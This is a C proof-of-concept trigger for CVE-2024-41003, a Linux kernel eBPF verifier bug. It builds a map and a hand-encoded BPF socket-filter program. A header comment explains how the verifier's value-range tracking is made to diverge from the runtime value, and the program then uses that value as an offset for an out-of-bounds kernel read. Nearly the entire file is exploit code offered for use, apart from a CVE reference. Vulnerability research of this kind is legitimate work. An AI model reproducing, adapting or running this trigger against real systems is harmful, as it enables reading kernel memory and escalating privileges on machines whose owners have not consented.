#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

/* CVE-2024-41003 FULL trigger sequence (Google LPC):
 *   R1 = read_from_map()        // runtime 0x7fffffff
 *   R1 |= 2
 *   if R1 != 0x7ffffffd goto b1:    // true (runtime 0x7fffffff)
 *   exit                            // false (impossible, bit2 conflict)
 * b1: R1 -= 0x7ffffff0              // verifier [2,0xE]; runtime 0xF
 *   if R1 s>= 0xE goto b2:
 *   exit
 * b2: R1 -= 0xE                     // verifier 0; runtime 1  <-- PRIMITIVE
 *   use R1 as offset -> OOB read
 *
 * CFG: condition-true jumps over its own false-exit block (no dead insns).
 * Main path reaches shared exit (24-25). Null path from insn 7 also lands there.
 */
static int create_map(void) {
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 2;
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static struct bpf_insn insns[] = {
    { .code = 0xb7, .dst_reg = 0, .off = 0, .imm = 0 },             /* 0: r0 = 0 */
    { .code = 0x63, .dst_reg = 10, .src_reg = 0, .off = -4, .imm = 0 }, /* 1: *(u32*)(fp-4) = 0 */
    { .code = 0x18, .dst_reg = 1, .src_reg = 1, .off = 0, .imm = 0 }, /* 2: r1 = map */
    { .code = 0x00, .dst_reg = 0, .off = 0, .imm = 0 },             /* 3: aux */
    { .code = 0xbf, .dst_reg = 2, .src_reg = 10, .off = 0, .imm = 0 }, /* 4: r2 = fp */
    { .code = 0x07, .dst_reg = 2, .off = 0, .imm = -4 },            /* 5: r2 += -4 */
    { .code = 0x85, .dst_reg = 0, .off = 0, .imm = 1 },             /* 6: call map_lookup_elem */
    { .code = 0x15, .dst_reg = 0, .src_reg = 0, .off = 17, .imm = 0 }, /* 7: if r0==0 goto +17 (to 25) */
    { .code = 0xbf, .dst_reg = 6, .src_reg = 0, .off = 0, .imm = 0 }, /* 8: r6 = r0 */
    { .code = 0x61, .dst_reg = 1, .src_reg = 6, .off = 0, .imm = 0 }, /* 9: w1 = *(u32*)(r6+0) */
    { .code = 0x44, .dst_reg = 1, .off = 0, .imm = 2 },             /* 10: w1 |= 2 */
    { .code = 0x56, .dst_reg = 1, .src_reg = 0, .off = 2, .imm = 0x7ffffffd }, /* 11: if w1 != 0x7ffffffd goto +2 (to 14) */
    { .code = 0xb7, .dst_reg = 0, .off = 0, .imm = 0 },             /* 12: r0 = 0 (false exit) */
    { .code = 0x95, .off = 0, .imm = 0 },                           /* 13: exit (impossible false) */
    { .code = 0xbf, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 }, /* 14: nop (b1, reached via 11) */
    { .code = 0x14, .dst_reg = 1, .off = 0, .imm = 0x7ffffff0 },    /* 15: w1 -= 0x7ffffff0 (b1) */
    { .code = 0x76, .dst_reg = 1, .src_reg = 0, .off = 2, .imm = 0xe }, /* 16: if w1 s>= 0xE goto +2 (to 19) */
    { .code = 0xb7, .dst_reg = 0, .off = 0, .imm = 0 },             /* 17: r0 = 0 (false exit) */
    { .code = 0x95, .off = 0, .imm = 0 },                           /* 18: exit */
    { .code = 0xbf, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 }, /* 19: nop (b2, reached via 16) */
    { .code = 0x14, .dst_reg = 1, .off = 0, .imm = 0xe },           /* 20: w1 -= 0xE (b2) <- primitive */
    { .code = 0x79, .dst_reg = 7, .src_reg = 6, .off = 0, .imm = 0 }, /* 21: r7 = *(u64*)(r6+0) */
    { .code = 0x0f, .dst_reg = 7, .src_reg = 1, .off = 0, .imm = 0 }, /* 22: r7 += w1 */
    { .code = 0x79, .dst_reg = 0, .src_reg = 7, .off = 0, .imm = 0 }, /* 23: r0 = *(u64*)(r7+0) OOB read */
    { .code = 0xb7, .dst_reg = 0, .off = 0, .imm = 0 },             /* 24: r0 = 0 */
    { .code = 0x95, .off = 0, .imm = 0 },                           /* 25: exit */
};

int main(int argc, char **argv) {
    int map_fd = create_map();
    if (map_fd < 0) { printf("map create failed: %d(%s)\n", errno, strerror(errno)); return 1; }
    printf("map_fd=%d\n", map_fd);
    uint32_t k0 = 0; uint64_t v0 = 0x7fffffffULL;
    union bpf_attr upd; memset(&upd, 0, sizeof(upd));
    upd.map_fd = map_fd; upd.key = (uint64_t)(uintptr_t)&k0; upd.value = (uint64_t)(uintptr_t)&v0;
    syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &upd, sizeof(upd));
    insns[2].imm = map_fd;

    char log_buf[65536];
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    memset(log_buf, 0, sizeof(log_buf));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = sizeof(insns)/sizeof(insns[0]);
    attr.insns = (uint64_t)(uintptr_t)insns;
    attr.license = (uint64_t)(uintptr_t)"GPL";
    attr.log_level = 2;
    attr.log_size = sizeof(log_buf);
    attr.log_buf = (uint64_t)(uintptr_t)log_buf;
    errno = 0;
    long fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("BPF_PROG_LOAD(full trigger) -> fd=%ld errno=%d(%s)\n", fd, errno, strerror(errno));
    if (fd > 0) close(fd);
    if (log_buf[0]) printf("LOG:\n%.60000s\n", log_buf);
    return 0;
}